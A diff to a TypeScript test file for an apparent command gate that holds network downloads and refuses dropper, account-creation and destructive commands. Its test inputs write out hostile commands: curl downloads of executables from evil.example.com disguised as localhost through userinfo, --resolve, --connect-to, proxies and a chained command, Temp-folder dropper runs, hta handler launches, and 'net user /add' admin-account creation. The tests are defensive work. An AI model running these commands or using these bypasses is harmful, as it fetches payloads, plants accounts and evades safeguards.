@@ -6,7 +6,8 @@
  * checks that set the exit code, in the places where a wrong answer costs the most:
  *
  * - the download hold's loopback exemption, which a URL with `user@` in it must not fool, whether
- *   the userinfo reads "localhost" or "127.0.0.1";
+ *   the userinfo reads "localhost" or "127.0.0.1", nor any other line that names localhost and
+ *   reaches somewhere else;
  * - the built-in floor (`dangerous.ts`), which must refuse a dropper run from Temp and must not
  *   refuse a project that happens to have a folder called `temp`, or a sentence with "ii" in it;
  * - the shipped deny list (`schema.ts`), line by line, git writes refused and git reads left open;
@@ -18,9 +19,9 @@
  * - the environment a step is started with, named rather than inherited;
  * - and one decision pin: an administrator's lock does not cap `execution.networkFetch`.
  *
- * Checks marked `// DEFECT:` fail today on purpose: each names a product defect, and the check turns
- * green when the defect is fixed. Nothing here starts a server, opens a browser or touches the
- * operator's data: the only files are in a temporary folder, removed at the end.
+ * A check marked `// DEFECT:` fails on purpose: it names a product defect, and turns green when the
+ * defect is fixed. Nothing here starts a server, opens a browser or touches the operator's data: the
+ * only files are in a temporary folder, removed at the end.
  *
  *   npx tsx test/gate.check.ts        (npm run check:gate once it is added to package.json)
  */
@@ -80,11 +81,11 @@ try {
   const savedApiPort = process.env.COP_API_PORT;
   delete process.env.COP_API_PORT;
   /*
-   * The first three are the plan's lines. The third is held today, but only because `x.bin` (bin is
-   * not in FILE_EXTENSIONS) reads as a second, non-loopback host; it proves nothing about the URL.
-   * The fourth and fifth carry the same 127.0.0.1 userinfo with nothing else on the line that could
-   * read as a host (`exe` is a known extension), so only the URL's host parse decides them: a fix
-   * that rejects a "localhost…@" userinfo and forgets the IP form leaves them red.
+   * The first three are the plan's lines. The third would be held even with the URL misread,
+   * because `x.bin` (bin is not in FILE_EXTENSIONS) reads as a second, non-loopback host; it proves
+   * nothing about the URL. The fourth and fifth carry the same 127.0.0.1 userinfo with nothing else
+   * on the line that could read as a host (`exe` is a known extension), so only the URL's host parse
+   * decides them: a reading that rejects a "localhost…@" userinfo and forgets the IP form fails them.
    */
   const disguised = [
     'curl -o tool.exe http://localhost:1@evil.example.com/tool.exe',
@@ -94,11 +95,38 @@ try {
     'curl http://127.0.0.1:8080@evil.example.com/',
   ];
   for (const cmd of disguised) {
-    // DEFECT: onlyLoopbackTargets takes the host up to the first ':' and ignores `user@`, so a URL whose userinfo is "localhost" or "127.0.0.1" counts as loopback (the x.bin line is held only because `x.bin` reads as a host).
+    // The host is what follows the last `@` of the authority, so these are evil.example.com, not this machine.
     t.truthy(`held, not exempt as loopback: ${cmd}`, networkFetchReason(cmd) !== null, 'networkFetchReason returned null');
     const refusal = checkCommandRefusal(cmd, 'pwsh', shipped, project);
-    // DEFECT: the same misreading lets the download straight through a check's gate, which refuses a fetch rather than holding it.
+    // And a check's gate, which has nobody to ask, refuses the fetch rather than letting it through.
     t.truthy(`refused as a check's command, as a network fetch: ${cmd}`, refusal !== null && refusal.includes('fetches from the network'), short(refusal));
+  }
+  /*
+   * The rest of the class: every other way a line that names localhost reaches somewhere else, or
+   * names an address the gate cannot read for certain. Quotes do not end a word to the shell, so a
+   * quoted localhost followed by `@host` is one URL with userinfo; a full-width dot becomes a plain
+   * one in a URL parser; a variable in the authority can carry `1@evil.example.com`; curl's
+   * --resolve, --connect-to and a proxy send a request for localhost to another address; -K reads
+   * more of the line from a file; and a second command glued on after a URL's path still counts.
+   */
+  const rerouted = [
+    'curl -o t.exe "http://localhost"@evil.example.com/t.exe',
+    "curl -o t.exe 'http://localhost:1'@evil.example.com/t.exe",
+    'curl -o t.exe http://localhost\uFF0Eevil.example.com/t.exe',
+    'curl -o t.exe http://local%68ost/t.exe',
+    'Invoke-WebRequest "http://localhost:$port/tool.exe" -OutFile tool.exe',
+    'curl --resolve localhost:80:93.184.216.34 -o tool.exe http://localhost/tool.exe',
+    'curl --resolve localhost:80:2001:db8::1 -o tool.exe http://localhost/tool.exe',
+    'curl --connect-to localhost:80:evil.example.com:80 -o tool.exe http://localhost/tool.exe',
+    'curl --connect-to ::evil.example.com: -o tool.exe http://localhost/tool.exe',
+    'curl -x evil.example.com:3128 -o tool.exe http://localhost/tool.exe',
+    'curl -x [2001:db8::1]:3128 -o tool.exe http://localhost/tool.exe',
+    'curl --proxy http://localhost:1@evil.example.com:3128 -o tool.exe http://localhost/tool.exe',
+    'curl -K more.txt -o tool.exe http://localhost/tool.exe',
+    "iwr http://localhost/x;iwr('evil.example.com') -OutFile a.exe",
+  ];
+  for (const cmd of rerouted) {
+    t.truthy(`held, not exempt as loopback: ${cmd}`, networkFetchReason(cmd) !== null, 'networkFetchReason returned null');
   }
   if (savedApiPort === undefined) delete process.env.COP_API_PORT;
   else process.env.COP_API_PORT = savedApiPort;
@@ -106,6 +134,19 @@ try {
   t.check('curl http://localhost:3000/health is loopback only', onlyLoopbackTargets('curl http://localhost:3000/health'), true);
   t.check('curl http://localhost:3000/health is not held', networkFetchReason('curl http://localhost:3000/health'), null);
   t.check('curl http://[::1]:3000/x is not held', networkFetchReason('curl http://[::1]:3000/x'), null);
+  // In the shapes a task writes them: a status read off the result, a query, an output file in a
+  // dotted project folder or under a drive, curl's -k and -i, which are not -K.
+  for (const cmd of [
+    '(Invoke-WebRequest http://localhost:3000).StatusCode',
+    "(Invoke-WebRequest 'http://localhost:3000').StatusCode",
+    'curl "http://localhost:3000/search?q=a&page=2"',
+    'curl -o .\\Contoso.Web\\out.json http://localhost:5000/health',
+    'Invoke-WebRequest -Uri http://localhost:3000/health -OutFile C:\\out\\health.json',
+    'curl -k https://localhost:5001/health',
+    'curl -i http://localhost:3000/health',
+  ]) {
+    t.check(`not held: ${cmd}`, networkFetchReason(cmd), null);
+  }
   /*
    * Decision pin: a loopback download saved as `a.zip` is held today. `zip` is not in
    * FILE_EXTENSIONS, so the output name reads as a second host beside the loopback URL, and the
@@ -129,9 +170,17 @@ try {
     'npx vitest run test/tmp/fixture.test.js',
     'Get-Content .\\src\\temp\\a.js',
     "Write-Output 'phase ii done'",
+    // The same two mistakes in other clothes: a project under C:\Projects with a temp folder, a
+    // variable whose name starts with TEMP, and "ii" as a numeral in a heading, a message and a list.
+    'node C:\\Projects\\app\\temp\\seed.js',
+    'node $env:TEMPLATE_DIR\\gen.js',
+    "Set-Content README.md '## Phase II of the rollout'",
+    "Write-Output 'II Results'",
+    'Write-Output "Steps: (i) build, (ii) test, (iii) ship"',
   ];
   for (const cmd of honest) {
-    // DEFECT: run-from-temp matches any path segment named temp/tmp (a project folder included), and handler-launch matches the bare word 'ii' anywhere in the line.
+    // Temp is the system's Temp, by its own spellings, never a project folder named temp or tmp; and
+    // `ii` is refused only where PowerShell would run it as a command, never as a word in a sentence.
     t.check(`not refused: ${cmd}`, dangerousRefusal(cmd), null);
   }
   const droppers = [
@@ -141,6 +190,21 @@ try {
     'ii .\\report.hta',
     'Invoke-Item .\\x.lnk',
     'certutil -decode a b',
+    // Temp by its other names, each of which reaches the same folder.
+    '& "$env:TMP\\a.exe"',
+    '%TMP%\\a.exe',
+    '& "${env:TEMP}\\a.exe"',
+    '& "$env:windir\\Temp\\a.exe"',
+    '%SystemRoot%\\Temp\\a.exe',
+    'node --require=/tmp/x.js',
+    'C:/tmp/a.exe',
+    // A handler launched wherever PowerShell runs it as a command: a pipe, a block, an assignment, a nested shell.
+    'Get-Item x.hta | ii',
+    'Get-ChildItem *.lnk | Invoke-Item',
+    'Get-ChildItem *.hta | ForEach-Object { ii $_ }',
+    '$null = ii .\\x.hta',
+    "pwsh -c 'ii .\\x.hta'",
+    "Start-Process pwsh -ArgumentList '-c','ii x.hta'",
   ];
   for (const cmd of droppers) t.truthy(`still refused: ${cmd}`, dangerousRefusal(cmd) !== null, 'dangerousRefusal returned null');
 
@@ -166,8 +230,19 @@ try {
     'vssadmin delete shadows /all',
     'Disable-WindowsOptionalFeature -Online -FeatureName x',
   ];
-  // Kept apart from `destructive` only so the deny-list loop below can name its defect on its own line.
+  /*
+   * Making an account, or putting one into a group. The ordinary form gives the password before
+   * `/add`, and the rest are the same act in another spelling; each is named by the list itself below.
+   */
   const netUserAdd = 'net user bob p /add';
+  const accounts = [
+    'net user bob * /add',
+    'net.exe user bob p /add',
+    'NET USER bob p /ADD',
+    'net localgroup administrators bob /add',
+    'New-LocalUser -Name bob -NoPassword',
+    'Add-LocalGroupMember -Group Administrators -Member bob',
+  ];
   const gitWrites = [
     'git commit -m x',
     'git push',
@@ -185,7 +260,7 @@ try {
     'git remote remove origin',
     'git remote set-url origin x',
   ];
-  for (const cmd of [...destructive, netUserAdd, ...gitWrites]) {
+  for (const cmd of [...destructive, netUserAdd, ...accounts, ...gitWrites]) {
     const d = staticCheck(step(cmd), unattended);
     t.check(`skipped: ${cmd}`, d?.action ?? null, 'skip');
   }
@@ -194,13 +269,17 @@ try {
    * operator may switch the allowlist off, so the list has to name each line on its own rather than
    * lean on `net` or `diskpart` happening to be off the allowlist.
    */
-  for (const cmd of [...destructive, ...gitWrites]) {
+  for (const cmd of [...destructive, ...accounts, ...gitWrites]) {
     t.truthy(`the deny list itself names: ${cmd}`, matchDenyPattern(cmd, shipped.denyPatterns) !== null, 'no shipped pattern matched');
   }
   // The control: the pattern exists and names the form without a password.
   t.truthy('the deny list itself names: net user bob /add', matchDenyPattern('net user bob /add', shipped.denyPatterns) !== null, 'no shipped pattern matched');
-  // DEFECT: the shipped pattern 'net\s+user\s+\w+\s+/add' (schema.ts) needs /add right after the name, so the ordinary form with a password slips past the deny list (skipped above only because `net` is off the default allowlist); a pattern such as 'net\s+user\b[^|;\n]*\s/add\b' names both.
+  // The ordinary form gives the password before /add; the list names it on its own, not because `net` is off the allowlist.
   t.truthy(`the deny list itself names: ${netUserAdd}`, matchDenyPattern(netUserAdd, shipped.denyPatterns) !== null, 'no shipped pattern matched');
+  // And it is about making accounts, not about looking at them.
+  for (const cmd of ['net user', 'net user bob', 'net localgroup administrators', 'Get-LocalUser', 'Get-LocalGroupMember -Group Administrators']) {
+    t.check(`the deny list leaves alone: ${cmd}`, matchDenyPattern(cmd, shipped.denyPatterns), null);
+  }
   const gitReads = [
     'git status',
     'git log -1',
